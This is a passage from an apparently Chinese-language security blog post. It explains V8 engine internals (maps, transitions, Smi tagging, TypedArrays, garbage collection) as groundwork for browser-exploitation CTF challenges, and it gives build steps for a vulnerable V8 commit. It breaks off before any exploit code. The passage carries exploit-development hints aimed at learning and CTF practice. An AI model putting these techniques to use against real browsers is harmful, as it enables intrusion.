<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> a = <span class="keyword">new</span> <span class="built_in">Array</span>();</span><br><span class="line">a[<span class="number">100</span>] = <span class="string">"test"</span>;</span><br><span class="line">a.length;               <span class="comment">//101</span></span><br></pre></td></tr></table></figure>
<p>除此之外数组和其他类型的对象都没有什么大的不同，函数也是对象，函数对象的<code>length</code>为函数形参的数量。</p>
<h4 id="Dictionary-mode"><a href="#Dictionary-mode" class="headerlink" title="Dictionary mode"></a>Dictionary mode</h4><p>v8使用哈希表来表示复杂的对象，访问哈希表的速度要远慢于访问已知偏移的对象。</p>
<p>哈希表的工作原理：v8中有许多种不同的方式表示一个string，最常见的property的名字是一个ASCII的字符串，所有的字符连续排列。</p>
<p>strings时不可修改的，但是<code>hash code</code>这个field是可以修改的，因为它是被计算出来的值，用于访问属性的字符串被称为<code>symbols</code>，这些字符串都是独特的，因此如果一个non-symbol string要用于访问property，它要先进行独特化。</p>
<p>v8的哈希表包括key和value.最开始时，所有的keys和values都是<code>undefined</code>。当一个key-value被插入进来，key的hash值就会被计算出来，hash code的低位将会作为开始插入的索引，如果该索引已经有数据则插入到下一个索引(模n,n为表空间大小)。</p>
<p>由于symbol strings是独特的，这些strings的hash code至多计算一次，之后比较keys相等的操作通常都比较快，但是这些开销仍然很大，当对属性进行读写时的速度很慢，V8尽可能避免使用这种方法进行表示</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">0:map(string type)</span><br><span class="line">4:length(in characters)</span><br><span class="line">8:hash code(lazily computed)</span><br><span class="line">12:characters</span><br></pre></td></tr></table></figure>
<h4 id="Fast-in-object-properties"><a href="#Fast-in-object-properties" class="headerlink" title="Fast,in-object properties"></a>Fast,in-object properties</h4><p>这部分涉及到了之前我们介绍的<code>Hidden class</code>概念，为了加速访问速度，让obj的内存布局在运行时也可以像静态语言一下规律排列，我们使用<code>maps</code>标识不同的对象，我们可以将maps理解成一个<code>descriptors table</code>，每个property都对应一个entry。Map还包含了其他的信息，比如obj的<code>size</code>，指向<code>constructor</code>和<code>prototypes</code>的指针，但是我们主要关注<code>descriptors</code>。拥有相同结构的对象通常共享相同的map。<code>Point</code>的一个结构化的实例可能会共享如下所示的map。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Point</span>(<span class="params">x, y</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">this</span>.x = x;</span><br><span class="line">  <span class="keyword">this</span>.y = y;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>我们可以想到并不是所有的Point的实例都有相同的属性集合，当一个Point对象刚分配的时候(在构造函数执行前)，它没有任何属性<code>M2</code>并不能精确地描述它的结构。此外，我们可以在构造函数执行后随时添加一个新的属性到Point对象中。</p>
<p>v8使用<code>transitions</code>的方式处理这种情况，当增加一个新属性的时候，如果不是必须创建一个新的map我们是不希望这样做的，我们倾向于使用现有的map，<code>transition descriptors</code>指向这些其他的maps。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Map M2</span><br><span class="line">  object size: 20 (space for 2 properties)</span><br><span class="line">  &quot;x&quot;: FIELD at offset 12</span><br><span class="line">  &quot;y&quot;: FIELD at offset 16</span><br></pre></td></tr></table></figure></p>
<p>因此可能存在如下的转变</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;Point object is allocated&gt;</span><br><span class="line"></span><br><span class="line">  Map M0</span><br><span class="line">    &quot;x&quot;: TRANSITION to M1 at offset 12</span><br><span class="line"></span><br><span class="line">this.x = x;</span><br><span class="line"></span><br><span class="line">  Map M1</span><br><span class="line">    &quot;x&quot;: FIELD at offset 12</span><br><span class="line">    &quot;y&quot;: TRANSITION to M2 at offset 16</span><br><span class="line"></span><br><span class="line">this.y = y;</span><br><span class="line"></span><br><span class="line">  Map M2</span><br><span class="line">    &quot;x&quot;: FIELD at offset 12</span><br><span class="line">    &quot;y&quot;: FIELD at offset 16</span><br></pre></td></tr></table></figure>
<p>假如说对一个使用<code>M2 map</code>属性的对象添加新属性，但是该属性推迟赋值，则会出现下面这种情况。因为z属性从来没有被分配过，我们创建了M2的拷贝M3，增加了一个新的filed描述符，并且为原来的M2 map增加了一个TRANSITION描述符。增加一个<code>transition</code>是唯一一种修改map的方式，大多数时候map都是无法修改的。</p>
<p>如果赋值的顺序不同，或者赋值的顺序混乱，又或者删除了其中的属性，则v8只能将obj放到hash表中</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">Map M2</span><br><span class="line">   &quot;x&quot;: FIELD at offset 12</span><br><span class="line">   &quot;y&quot;: FIELD at offset 16</span><br><span class="line">   &quot;z&quot;: TRANSITION at offset 20</span><br><span class="line"></span><br><span class="line">this.z = z;</span><br><span class="line"></span><br><span class="line">  Map M3</span><br><span class="line">    &quot;x&quot;: FIELD at offset 12</span><br><span class="line">    &quot;y&quot;: FIELD at offset 16</span><br><span class="line">    &quot;z&quot;: FIELD at offset 20</span><br></pre></td></tr></table></figure>
<h4 id="In-object-slack-tracking"><a href="#In-object-slack-tracking" class="headerlink" title="In-object slack tracking"></a>In-object slack tracking</h4><p>v8使用<code>In-object slack tracking</code>来判断为一个对象的实例分配多少空间。最开始，constructor分配的对象被分配了一个巨大的空间:足够32个fast properties存储。一旦使用相同的构造器构造出一定数量的obj，v8通过遍历这些原始obj的map的transition tree。新的obj就可以精准地分配足够空间来存储properties(大于其数量的最大值)。也有一些有趣的trick来对原始obj进行resize。当原始obj第一次被分配时，它们的fileds将被初始，这样在gc看来它们就是空闲的空间。但是gc不会真的将他们看作空闲空间，因为maps标识了对象的大小。然而当<code>slack tracking process</code><br>结束后，新的实例的size就会写入到transition tree的maps中，因此有这些maps的obj大小显著减小。因为unused filed已经看上去像是空闲space，最开始的obj不需要被修改。</p>
<p>在这个过程结束后再增加新的property，会使用<code>overflow array</code>来存储<code>extra property</code>，这里就会使用<code>realloc</code>来扩大空间。</p>
<p><del>= =本来这里已经写完了，但是因为笔记误删(vscode未成功保存导致文件为空)这部分又得重新写，因此比之前要写的简单一点</del></p>
<h4 id="Methods-and-prototypes"><a href="#Methods-and-prototypes" class="headerlink" title="Methods and prototypes"></a>Methods and prototypes</h4><p>v8存放methods时不能将其看成in-object的属性，否则开销太大，这里借鉴了c++的vtable的思想，关于vtable可以参见<a href="https://pabloariasal.github.io/2017/06/10/understanding-virtual-tables/" target="_blank" rel="noopener">Understandig Virtual Tables in C++</a>,v8在maps里使用constant_function表示方法，只有constant_function相同的maps才可以相互transition。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Point</span>(<span class="params">x, y</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">this</span>.x = x;</span><br><span class="line">  <span class="keyword">this</span>.y = y;</span><br><span class="line">  <span class="keyword">this</span>.distance = PointDistance;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">PointDistance</span>(<span class="params">p</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> dx = <span class="keyword">this</span>.x - p.x;</span><br><span class="line">  <span class="keyword">var</span> dy = <span class="keyword">this</span>.y - p.y;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">Math</span>.sqrt(dx*dx + dy*dy);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>如下图所示<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">&lt;Point object is allocated&gt;</span><br><span class="line"></span><br><span class="line">  Map M0</span><br><span class="line">    &quot;x&quot;: TRANSITION to M1 at offset 12</span><br><span class="line"></span><br><span class="line">this.x = x;</span><br><span class="line"></span><br><span class="line">  Map M1</span><br><span class="line">    &quot;x&quot;: FIELD at offset 12</span><br><span class="line">    &quot;y&quot;: TRANSITION to M2 at offset 16</span><br><span class="line"></span><br><span class="line">this.y = y;</span><br><span class="line"></span><br><span class="line">  Map M2</span><br><span class="line">    &quot;x&quot;: FIELD at offset 12</span><br><span class="line">    &quot;y&quot;: FIELD at offset 16</span><br><span class="line">    &quot;distance&quot;: TRANSITION to M3 &lt;PointDistance&gt;</span><br><span class="line"></span><br><span class="line">this.distance = PointDistance;</span><br><span class="line"></span><br><span class="line">  Map M3</span><br><span class="line">    &quot;x&quot;: FIELD at offset 12</span><br><span class="line">    &quot;y&quot;: FIELD at offset 16</span><br><span class="line">    &quot;distance&quot;: CONSTANT_FUNCTION &lt;PointDistance&gt;</span><br></pre></td></tr></table></figure></p>
<p>v8还提供了一种原型的方法让我们使用，prototype可以看作是一个root object，v8的obj认为其包含自身所有的属性</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Point</span>(<span class="params">x, y</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">this</span>.x = x;</span><br><span class="line">  <span class="keyword">this</span>.y = y;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Point.prototype.distance = <span class="function"><span class="keyword">function</span>(<span class="params">p</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> dx = <span class="keyword">this</span>.x - p.x;</span><br><span class="line">  <span class="keyword">var</span> dy = <span class="keyword">this</span>.y - p.y;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">Math</span>.sqrt(dx*dx + dy*dy);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"><span class="keyword">var</span> u = <span class="keyword">new</span> Point(<span class="number">1</span>, <span class="number">2</span>);</span><br><span class="line"><span class="keyword">var</span> v = <span class="keyword">new</span> Point(<span class="number">3</span>, <span class="number">4</span>);</span><br><span class="line"><span class="keyword">var</span> d = u.distance(v);</span><br></pre></td></tr></table></figure>
<h4 id="Numbered-properties-fast-elements"><a href="#Numbered-properties-fast-elements" class="headerlink" title="Numbered properties: fast elements"></a>Numbered properties: fast elements</h4><p>主要有三种类型<code>fast small integers\fast doubles\fast values</code>，当数据类型无法表示smi时会进行转换，当访问的Index和长度相差过多时会降级到dictionary mode</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// This will be slow for large arrays.</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">copy</span>(<span class="params">a</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> b = <span class="keyword">new</span> <span class="built_in">Array</span>();</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">var</span> i = a.length - <span class="number">1</span>; i &gt;= <span class="number">0</span>; i--)</span><br><span class="line">    b[i] = a[i];</span><br><span class="line">  <span class="keyword">return</span> b;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="对象模型"><a href="#对象模型" class="headerlink" title="对象模型"></a>对象模型</h3><p>首先是一个继承关系的图</p>
<p><img src="/2021/05/13/v8-basic/43.png" alt></p>
<h4 id="Object-amp-amp-Tagged-Object"><a href="#Object-amp-amp-Tagged-Object" class="headerlink" title="Object &amp;&amp; Tagged Object"></a>Object &amp;&amp; Tagged Object</h4><h5 id="Smi"><a href="#Smi" class="headerlink" title="Smi"></a>Smi</h5><p>Smi是Unbox的整数，在32位系统下是带符号的31位；64位系统下是带符号的32位。</p>
<p>Smi直接存储在obj中，LSB=1时表示指针，否则为数字。</p>
<h5 id="HeapObject"><a href="#HeapObject" class="headerlink" title="HeapObject"></a>HeapObject</h5><p>HeapNumber继承自HeapObject，对象的值为double。</p>
<p><img src="/2021/05/13/v8-basic/44.png" alt></p>
<p>String为字符串对象</p>
<p><img src="/2021/05/13/v8-basic/45.png" alt></p>
<p>JSObject里需要关注elements和property的区别</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">a.prop;   <span class="comment">//property</span></span><br><span class="line">a[<span class="number">1</span>];     <span class="comment">//elements</span></span><br></pre></td></tr></table></figure>
<p><img src="/2021/05/13/v8-basic/46.png" alt></p>
<p>JSFunction需要关注kCodeEntryOffset*,如果是一个JIT优化过的函数，这里指向一个rwx的区域</p>
<p><img src="/2021/05/13/v8-basic/47.png" alt></p>
<p>JSArrry</p>
<p><img src="/2021/05/13/v8-basic/48.png" alt></p>
<p>JSArraryBuffer主要是ArrayBuffer和TypedArray。前者只是一个缓冲区，后者可以绑定一个缓冲区，以不同形式进行读取。</p>
<p>直接创建TypedArray(这里会自己创建一个ArrayBuffer)</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> a = <span class="keyword">new</span> <span class="built_in">Uint8Array</span>(<span class="number">100</span>);</span><br><span class="line"><span class="keyword">var</span> b = <span class="keyword">new</span> <span class="built_in">Uint8Array</span>([<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>,<span class="number">4</span>]);</span><br></pre></td></tr></table></figure>
<p>先创建ArrayBuffer在绑定TypedArray(同一个ArrayBuffer可以被多个TypedArray绑定)，这也是exp编写里数据转换的方式。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> a = <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">8</span>);</span><br><span class="line"><span class="keyword">var</span> b = <span class="keyword">new</span> <span class="built_in">Uint8Array</span>(a);</span><br><span class="line"><span class="keyword">var</span> c = <span class="keyword">new</span> <span class="built_in">Uint8Array</span>(a, <span class="number">0</span>, <span class="number">4</span>); <span class="comment">// 指定起始位置</span></span><br></pre></td></tr></table></figure>
<p><img src="/2021/05/13/v8-basic/49.png" alt></p>
<h3 id="GC"><a href="#GC" class="headerlink" title="GC"></a>GC</h3><p>GC的管理可以分成两部分，young generation是针对运行时间不长，第一次gc的obj;old generation针对经过了多次gc的obj，内存回收的次数比较少;other里是针对large object的回收</p>
<p><img src="/2021/05/13/v8-basic/41.png" alt></p>
<p>GC使用cheney算法进行回收，将内存区域分成两部分，To-Space是使用的空间，From-Space是空闲的空间，obj会从前者转移到后者，living obj会拿回到to-space或者old generation(多次gc的)，其余会被回收。</p>
<p><img src="/2021/05/13/v8-basic/42.png" alt></p>
<p>写内存分配相关的exp时，需要有意识地调用gc来使目标对象放在old generation里，这样布局相对稳定。</p>
<p>具体还可以参看<a href="http://jayconrod.com/posts/55/a-tour-of-v8-garbage-collection" target="_blank" rel="noopener">a-tour-of-v8-garbage-collection</a></p>
<h3 id="CTF题目"><a href="#CTF题目" class="headerlink" title="CTF题目"></a>CTF题目</h3><h4 id="CTF-2019-OOB"><a href="#CTF-2019-OOB" class="headerlink" title="*CTF 2019 OOB"></a>*CTF 2019 OOB</h4><p>之前入门的调的题，<a href="https://ama2in9.top/2020/09/03/oob/">OOB</a></p>
<h4 id="数字经济云安全大赛-Browser"><a href="#数字经济云安全大赛-Browser" class="headerlink" title="数字经济云安全大赛 Browser"></a>数字经济云安全大赛 Browser</h4><p>暑期实习面试前调的题目<a href="https://ama2in9.top/2021/03/05/shuzijingji/">2019-数字经济大赛决赛-Browser</a></p>
<h4 id="roll-a-d8"><a href="#roll-a-d8" class="headerlink" title="roll_a_d8"></a>roll_a_d8</h4><p>题目描述如下，我们去issue列表里搜索<code>OOB</code>，找到<a href="https://bugs.chromium.org/p/chromium/issues/detail?id=821137&amp;q=821137&amp;can=2" target="_blank" rel="noopener">issue-821137</a>，查看邮件中修复的部分，找到修复的<a href="https://chromium.googlesource.com/v8/v8.git/+/b5da57a06de8791693c248b7aafc734861a3785d%5E%21/" target="_blank" rel="noopener">commit</a>，选择a的src查看包含漏洞的branch为<code>1dab065bb4025bdd663ba12e2e976c34c3fa6599</code>，这应该就是我们需要切换的漏洞版本了。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">编译命令</span><br><span class="line">git clone https://chromium.googlesource.com/v8/v8.git</span><br><span class="line">git checkout (before Mar 7, 2018)</span><br><span class="line">cd v8 &amp; gclient sync</span><br><span class="line">sudo apt install libncurses5</span><br><span class="line">tools/dev/v8gen.py ia32.release</span><br><span class="line">tools/dev/v8gen.py ia32.debug</span><br><span class="line"></span><br><span class="line">ninja -C out.gn/ia32.release d8 </span><br><span class="line">ninja -C out.gn/ia32.debug d8</span><br></pre></td></tr></table></figure>
<p><img src="/2021/05/13/v8-basic/50.png" alt></p>
<h5 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h5><p>我们找到目标函数(由于本地src是最新源码，因此我们还是看上面那个branch的函数),这个方法是<code>class ArrayPopulatorAssembler : public CodeStubAssembler</code>的方法，有篇文章<a href="https://v8.dev/docs/csa-builtins" target="_blank" rel="noopener">csa-builtins</a>介绍了如何自己编写一个builtin。我们简单概括一下编写思路。</p>
<p>首先v8可以通过不同的方式实现builtin:asm/c++/js/CodeStubAssembler。</p>
<p>CSA提供Low-level的asm的抽象，也提供了high-level的函数的扩展</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Low-level:</span></span><br><span class="line"><span class="comment">// Loads the pointer-sized data at addr into value.</span></span><br><span class="line">Node* addr = <span class="comment">/* ... */</span>;</span><br><span class="line">Node* value = Load(MachineType::IntPtr(), addr);</span><br><span class="line"></span><br><span class="line"><span class="comment">// And high-level:</span></span><br><span class="line"><span class="comment">// Performs the JS operation ToString(object).</span></span><br><span class="line"><span class="comment">// ToString semantics are specified at https://tc39.es/ecma262/#sec-tostring.</span></span><br><span class="line">Node* object = <span class="comment">/* ... */</span>;</span><br><span class="line">Node* <span class="built_in">string</span> = ToString(context, object);</span><br></pre></td></tr></table></figure>
<p>CSA的builtins在TurboFan的编译阶段使用得到最终的执行代码(优化阶段不使用)</p>
<p>写一个CSA builtin:我们编写一个Builtin，只接受一个参数，返回值是否为42.这个builtin将install到Math以暴露给js使用，在这个例子中我们的编写步骤如下：</p>
<ol>
<li>使用js linkage创建一个CSA builtin，可以像js函数一样调用它</li>
<li>使用CSA实现简单的逻辑：对Smi和Heap-number处理，条件语句，调用TFS builtins</li>
<li>使用CSA builtin</li>
<li>安装到Math这个obj上</li>
</ol>
<p>声明MathIs42:builtins在<code>src/builtins/builtins-definitions.h</code>的<code>BUILTIN_LIST_BASE</code>宏进行声明，我们可以使用下面的代码声明CSA的builtin(带一个参数x)</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BUILTIN_LIST_BASE(CPP, API, TFJ, TFC, TFS, TFH, ASM, DBG)              \</span></span><br><span class="line">TFJ(MathIs42, <span class="number">1</span>, kx)</span><br></pre></td></tr></table></figure>
<p><code>BUILTIN_LIST_BASE</code>使用不同的宏表示不同的builtins.CSA的builtins主要可以分为下面的：</p>
<ol>
<li>TFJ:JS linkage</li>
<li>TFS:Stub linkage</li>
<li>TFC:要求一个用户接口描述符的Stub linkage</li>
<li>TFH:用于Inline Caching的特殊的stub linkage</li>
</ol>
<p>定义写在<code>src/builtins/builtins-*-gen.cc</code>文件中，因为我们是在Math obj里添加builtin，所以我们在<code>src/builtins/builtins-math-gen.cc</code>添加如下代码.注释很详细，<code>context</code>是一个全局变量作用域，相当于一个window object(类比我们浏览器中打开的一个窗口)，它保存了js运行的环境，下面<code>Label</code>类似汇编中的标签，<code>Branch</code>表示分支判断，为真则去label1，否则跳转到label2，每个label使用BIND绑定一个代码块进行处理。</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// TF_BUILTIN is a convenience macro that creates a new subclass of the given</span></span><br><span class="line"><span class="comment">// assembler behind the scenes.</span></span><br><span class="line">TF_BUILTIN(MathIs42, MathBuiltinsAssembler) &#123;</span><br><span class="line">  <span class="comment">// Load the current function context (an implicit argument for every stub)</span></span><br><span class="line">  <span class="comment">// and the X argument. Note that we can refer to parameters by the names</span></span><br><span class="line">  <span class="comment">// defined in the builtin declaration.</span></span><br><span class="line">  Node* <span class="keyword">const</span> context = Parameter(Descriptor::kContext);</span><br><span class="line">  Node* <span class="keyword">const</span> x = Parameter(Descriptor::kX);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// At this point, x can be basically anything - a Smi, a HeapNumber,</span></span><br><span class="line">  <span class="comment">// undefined, or any other arbitrary JS object. Let’s call the ToNumber</span></span><br><span class="line">  <span class="comment">// builtin to convert x to a number we can use.</span></span><br><span class="line">  <span class="comment">// CallBuiltin can be used to conveniently call any CSA builtin.</span></span><br><span class="line">  Node* <span class="keyword">const</span> number = CallBuiltin(Builtins::kToNumber, context, x);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Create a CSA variable to store the resulting value. The type of the</span></span><br><span class="line">  <span class="comment">// variable is kTagged since we will only be storing tagged pointers in it.</span></span><br><span class="line">  VARIABLE(var_result, MachineRepresentation::kTagged);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// We need to define a couple of labels which will be used as jump targets.</span></span><br><span class="line">  Label if_issmi(this), if_isheapnumber(this), out(this);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// ToNumber always returns a number. We need to distinguish between Smis</span></span><br><span class="line">  <span class="comment">// and heap numbers - here, we check whether number is a Smi and conditionally</span></span><br><span class="line">  <span class="comment">// jump to the corresponding labels.</span></span><br><span class="line">  Branch(TaggedIsSmi(number), &amp;if_issmi, &amp;if_isheapnumber);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Binding a label begins generating code for it.</span></span><br><span class="line">  BIND(&amp;if_issmi);</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="comment">// SelectBooleanConstant returns the JS true/false values depending on</span></span><br><span class="line">    <span class="comment">// whether the passed condition is true/false. The result is bound to our</span></span><br><span class="line">    <span class="comment">// var_result variable, and we then unconditionally jump to the out label.</span></span><br><span class="line">    var_result.Bind(SelectBooleanConstant(SmiEqual(number, SmiConstant(<span class="number">42</span>))));</span><br><span class="line">    Goto(&amp;out);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  BIND(&amp;if_isheapnumber);</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="comment">// ToNumber can only return either a Smi or a heap number. Just to make sure</span></span><br><span class="line">    <span class="comment">// we add an assertion here that verifies number is actually a heap number.</span></span><br><span class="line">    CSA_ASSERT(<span class="keyword">this</span>, IsHeapNumber(number));</span><br><span class="line">    <span class="comment">// Heap numbers wrap a floating point value. We need to explicitly extract</span></span><br><span class="line">    <span class="comment">// this value, perform a floating point comparison, and again bind</span></span><br><span class="line">    <span class="comment">// var_result based on the outcome.</span></span><br><span class="line">    Node* <span class="keyword">const</span> value = LoadHeapNumberValue(number);</span><br><span class="line">    Node* <span class="keyword">const</span> is_42 = Float64Equal(value, Float64Constant(<span class="number">42</span>));</span><br><span class="line">    var_result.Bind(SelectBooleanConstant(is_42));</span><br><span class="line">    Goto(&amp;out);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  BIND(&amp;out);</span><br><span class="line">  &#123;</span><br><span class="line">    Node* <span class="keyword">const</span> result = var_result.value();</span><br><span class="line">    CSA_ASSERT(<span class="keyword">this</span>, IsBoolean(result));</span><br><span class="line">    Return(result);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>最后，我们在<code>src/bootstrapper.cc</code>中attach上这个方法(facktory用于生产新的对象)。之后我们使用<code>Math.is42(42);</code>调用该方法测试即可</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Existing code to set up Math, included here for clarity.</span></span><br><span class="line">Handle&lt;JSObject&gt; math = factory-&gt;NewJSObject(cons, TENURED);</span><br><span class="line">JSObject::AddProperty(global, name, math, DONT_ENUM);</span><br><span class="line"><span class="comment">// […snip…]</span></span><br><span class="line">SimpleInstallFunction(math, <span class="string">"is42"</span>, Builtins::kMathIs42, <span class="number">1</span>, <span class="literal">true</span>);</span><br></pre></td></tr></table></figure>
<p>关于isolate和context可以看下<a href="https://chromium.googlesource.com/chromium/src/+/master/third_party/blink/renderer/bindings/core/v8/V8BindingDesign.md" target="_blank" rel="noopener">Design of V8 bindings</a></p>
<p>我们回来继续看这个方法.(ps:在<a href="https://source.chromium.org/chromium/v8/v8.git/+/b5da57a06de8791693c248b7aafc734861a3785d:src/builtins/builtins-array-gen.cc;dlc=1dab065bb4025bdd663ba12e2e976c34c3fa6599" target="_blank" rel="noopener">这里</a>可以看到可视化更好的diff)</p>
